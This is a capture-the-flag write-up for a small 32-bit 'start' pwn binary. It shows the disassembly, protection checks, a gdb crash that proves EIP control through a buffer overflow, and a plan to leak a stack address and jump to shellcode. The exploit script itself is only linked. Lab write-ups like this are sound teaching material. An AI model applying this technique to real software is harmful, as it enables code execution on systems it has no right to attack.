## Introduction

this binary is a tiny pwn 
```
./start:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:	54                   	push   %esp
 8048061:	68 9d 80 04 08       	push   $0x804809d
 8048066:	31 c0                	xor    %eax,%eax
 8048068:	31 db                	xor    %ebx,%ebx
 804806a:	31 c9                	xor    %ecx,%ecx
 804806c:	31 d2                	xor    %edx,%edx
 804806e:	68 43 54 46 3a       	push   $0x3a465443
 8048073:	68 74 68 65 20       	push   $0x20656874
 8048078:	68 61 72 74 20       	push   $0x20747261
 804807d:	68 73 20 73 74       	push   $0x74732073
 8048082:	68 4c 65 74 27       	push   $0x2774654c
 8048087:	89 e1                	mov    %esp,%ecx
 8048089:	b2 14                	mov    $0x14,%dl
 804808b:	b3 01                	mov    $0x1,%bl
 804808d:	b0 04                	mov    $0x4,%al
 804808f:	cd 80                	int    $0x80
 8048091:	31 db                	xor    %ebx,%ebx
 8048093:	b2 3c                	mov    $0x3c,%dl
 8048095:	b0 03                	mov    $0x3,%al
 8048097:	cd 80                	int    $0x80
 8048099:	83 c4 14             	add    $0x14,%esp
 804809c:	c3                   	ret    

0804809d <_exit>:
 804809d:	5c                   	pop    %esp
 804809e:	31 c0                	xor    %eax,%eax
 80480a0:	40                   	inc    %eax
 80480a1:	cd 80                	int    $0x80
```

although it have NX
```
[*] '/root/ctf/edu_ctf/pwn/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```
but in fact stack can execute shellcode
```
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/root/ctf/edu_ctf/pwn/start/start
0xf7ffd000 0xf7ffe000 r-xp	[vdso]
0xfffdd000 0xffffe000 rwxp	[stack]
```

## Vulnerbility

In this binary it just do 2 syscall
```
sys_write(1, "Let's start the CTF:", 0x14);
sys_read(0, buf, 0x3c);
```

is a easy buffer overflow
```
gdb-peda$ r <<< `python -c "print 'a'*30"`
Starting program: /root/ctf/edu_ctf/pwn/start/./start <<< `python -c "print 'a'*30"`
Let's start the CTF:
Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0x1f 
EBX: 0x0 
ECX: 0xffffd694 ('a' <repeats 30 times>, "\n")
EDX: 0x3c ('<')
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xffffd6ac ("aaaaaa\n")
EIP: 0x61616161 ('aaaa')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61616161
[------------------------------------stack-------------------------------------]
0000| 0xffffd6ac ("aaaaaa\n")
0004| 0xffffd6b0 --> 0xa6161 ('aa\n')
0008| 0xffffd6b4 --> 0xffffd7e0 ("/root/ctf/edu_ctf/pwn/start/./start")
0012| 0xffffd6b8 --> 0x0 
0016| 0xffffd6bc --> 0xffffd804 ("XDG_SESSION_ID=1")
0020| 0xffffd6c0 --> 0xffffd815 ("HOSTNAME=50000-AntiVir-Linux")
0024| 0xffffd6c4 --> 0xffffd832 ("SELINUX_ROLE_REQUESTED=")
0028| 0xffffd6c8 --> 0xffffd84a ("SHELL=/bin/bash")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61616161 in ?? ()
gdb-peda$ 
```

and first one we need to leak stack address,and jmp to stack to execute shellcode

this binary only one output call is write,
```
804806e:	68 43 54 46 3a       	push   $0x3a465443
8048073:	68 74 68 65 20       	push   $0x20656874
8048078:	68 61 72 74 20       	push   $0x20747261
804807d:	68 73 20 73 74       	push   $0x74732073
8048082:	68 4c 65 74 27       	push   $0x2774654c
8048087:	89 e1                	mov    %esp,%ecx
8048089:	b2 14                	mov    $0x14,%dl
804808b:	b3 01                	mov    $0x1,%bl
804808d:	b0 04                	mov    $0x4,%al
804808f:	cd 80                	int    $0x80
```

when control eip,`ecx = buf`and`edx=0x3c`,and jmp to `0x804808b`

it will call like:
```
sys_write(1, buf, 0x3c);
```
it write size is 0x3c,is already big then buf,so is will leak some information

and then you can read again,and control eip again,and jmp to shellcode!!

[payload](exp.rb)

